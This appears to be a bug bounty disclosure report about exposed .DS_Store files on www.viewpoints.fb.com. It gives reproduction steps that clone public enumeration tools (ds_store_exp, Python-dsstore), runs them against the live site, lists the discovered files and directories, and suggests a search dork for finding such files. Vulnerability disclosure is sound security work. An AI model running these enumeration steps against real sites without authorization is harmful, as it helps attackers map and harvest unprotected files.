=====
Information Disclosure through .DS_Store in www.viewpoints.fb.com

The website located at www.viewpoints.fb.com has an information disclosure through ".DS_Store" file, accessible to unauthorized external users.
======
MacOS .DS_Store Directory Listing Disclosure Vulnerability
In macOS operating system, .DS_Store is a file that stores custom attributes of its containing folder, such as the position of icons or js files and some configurations . Also list the whole files on directory that has been created as hidden file file, automatically by MacOS. 
This information could provide an attacker with sensitive information including system configuration, installed applications, etc. Properly exploited.
===
Browser: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36]

OS: [Kernel Linux 5.9.0-2parrot1-amd64 x86_64]
1. Go to the Url: https://www.viewpoints.fb.com/.DS_Store and the DS_Store file automatically downloaded
2.  Setup the dsstore.py, then Run the script and see the output 
git clone https://github.com/gehaxelt/Python-dsstore && cd Python-dsstore/ && chmod +x dsstore.py 
python3 ./main.py ~/Downloads/DS_Store 
3. Then the files are listed, well let’s see what happens with the other directories, for example, “images”, navigate to https://www.viewpoints.fb.com/images/.DS_Store and the (.DS_Store) file, again downloads automatically.
4. Run the below script for the .DS_Store see the output
git clone https://github.com/lijiejie/ds_store_exp
cd ds_store_exp
sudo pip2 install -r requirements.txt
python2 ./ds_store_exp.py https://www.viewpoints.fb.com/.DS_Store

Output:
[200] https://www.viewpoints.fb.com/.DS_Store
[200] https://www.viewpoints.fb.com/package.json
[200] https://www.viewpoints.fb.com/sourceimages/.DS_Store
[200] https://www.viewpoints.fb.com/selection.json
[403] https://www.viewpoints.fb.com/js
[200] https://www.viewpoints.fb.com/js/.DS_Store
[403] https://www.viewpoints.fb.com/grunt-settings.js/.DS_Store
[200] https://www.viewpoints.fb.com/grunt-settings.js
[200] https://www.viewpoints.fb.com/Gruntfile.js
[200] https://www.viewpoints.fb.com/package-lock.json
[403] https://www.viewpoints.fb.com/Gruntfile.js/.DS_Store
[403] https://www.viewpoints.fb.com/index.html/.DS_Store
[403] https://www.viewpoints.fb.com/css/.DS_Store
[200] https://www.viewpoints.fb.com/SF_font/.DS_Store
[200] https://www.viewpoints.fb.com/newsletter/.DS_Store
[200] https://www.viewpoints.fb.com/email_confirmation/.DS_Store

4. Then Confirm vía browser the accessibility for any file listed for example “selection.json” , go to https://www.viewpoints.fb.com/selection.json via any browser and see the file.

5. Repeat in whole Directory “Five”, if you can access to any “.DS_Store” you can see the directory listing
The “.DS_Store” files founded on https://www.viewpoints.fb.com/ :
https://www.viewpoints.fb.com/sourceimages/.DS_Store
https://www.viewpoints.fb.com/js/.DS_Store
https://www.viewpoints.fb.com/SF_font/.DS_Store
https://www.viewpoints.fb.com/newsletter/.DS_Store
https://www.viewpoints.fb.com/email_confirmation/.DS_Store

How can the attacker get the file? Easy, with a simple google/bing dork or example “site:www.viewpoints.fb.com filetype(.DS_Store OR DS_Store)” or maybe with a manual test on any directories or image directories adding .DS_Store at the end of the URLs.

See attached pictures 
